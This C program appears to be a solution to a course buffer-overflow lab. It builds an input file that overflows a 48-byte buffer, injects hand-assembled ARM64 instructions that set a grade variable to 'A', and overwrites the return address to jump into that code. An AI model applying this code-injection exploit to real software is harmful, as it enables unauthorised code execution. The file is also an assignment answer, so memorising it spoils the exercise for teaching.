#include <stdio.h>
#include "miniassembler.h"

enum {
    MAX_BUFFER = 48,       /* total bytes that fit in the buffer */
    GRADE_ADDR = 0x420044, /* address of the grade variable */
    PRINT_INSTR_ADDR = 0x400864, /* address of the print grade instruction */
    CODE_SEQUENCE_LEN = 17  /* total length (in bytes) of inserted instructions */
};

/* 
   produces a file called dataA that forces the grader program to output 
   a grade of 'A' for "Anish Solo". the approach is to:
   1) write the name "Anish Solo" and a null terminator into the dataA file.
   2) pad until the stack aligns properly.
   3) inject instructions generated by the mini assembler:
      - mov w0, 'A'
      - adr x1, &grade
      - strb w0, [x1]
      - b to print the grade line
   4) fill any remaining buffer space with zeros.
   5) overwrite return address to jump into these instructions.
   
   thus, when the grader reads 'dataA' as input, it will execute our code and 
   result in printing 'A is your grade.' instead of the intended grade.
*/

/*
this main function:
- does not accept any command-line arguments.
- does not read from stdin or any other input stream.
- writes a carefully crafted sequence of bytes to a file named "dataA".
- returns 0 on success, non-zero if an error (such as a name too long) occurs.
*/

int main(void) {
    int iBytesWritten = 0;              /* tracks how many bytes we've put in dataA */
    unsigned long ulCurrentAddr = 0x420058; /* starting address after 'name' array in bss section */
    unsigned int uiInstruction;        /* holds each generated instruction */
    FILE *pFile = fopen("dataA", "w"); /* output file pointer */

    /* write the chosen name "Anish Solo" */
    /* no newline chars and exactly 10 bytes: 'A' 'n' 'i' 's' 'h' ' ' 'S' 'o' 'l' 'o' */
    fputs("Anish Solo", pFile);
    iBytesWritten += 10;

    /* verify that there's room for instructions after the name */
    if (iBytesWritten == MAX_BUFFER - CODE_SEQUENCE_LEN) {
        /* if no room for code, abort with an error */
        fprintf(stderr, "Name leaves no space for code.\n");
        return 1;
    }

    /* write a null terminator after the name */
    fputc('\0', pFile);
    iBytesWritten++;
    ulCurrentAddr += iBytesWritten; /* adjust current address after writing these bytes */

    /* ensure address alignment by writing null bytes until ulCurrentAddr is 4-byte aligned */
    while (ulCurrentAddr % 4 != 0) {
        fputc('\0', pFile);
        iBytesWritten++;
        ulCurrentAddr++;
    }

    /* now inject instructions to place 'A' in w0 */
    /* mov w0, 'A' */
    uiInstruction = MiniAssembler_mov(0, 'A');
    fwrite(&uiInstruction, sizeof(unsigned int), 1, pFile);
    iBytesWritten += 4;

    /* adr x1, &grade */
    /* calculates displacement from ulCurrentAddr+4 (next instr) to GRADE_ADDR */
    uiInstruction = MiniAssembler_adr(1, GRADE_ADDR, ulCurrentAddr + 4);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, pFile);
    iBytesWritten += 4;

    /* strb w0, [x1] */
    uiInstruction = MiniAssembler_strb(0, 1);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, pFile);
    iBytesWritten += 4;

    /* b PRINT_INSTR_ADDR */
    /* branch to instruction that prints '%c is your grade.\n' line */
    uiInstruction = MiniAssembler_b(PRINT_INSTR_ADDR, ulCurrentAddr + 12);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, pFile);
    iBytesWritten += 4;

    /* fill the remainder of the 48-byte buffer with zeros */
    while (iBytesWritten != MAX_BUFFER) {
        fputc('\0', pFile);
        iBytesWritten++;
    }

    /* overwrite the stored return address with ulCurrentAddr,
       causing execution to jump into our injected instructions. */
    fwrite(&ulCurrentAddr, sizeof(unsigned long), 1, pFile);


    fclose(pFile);
    return 0;
}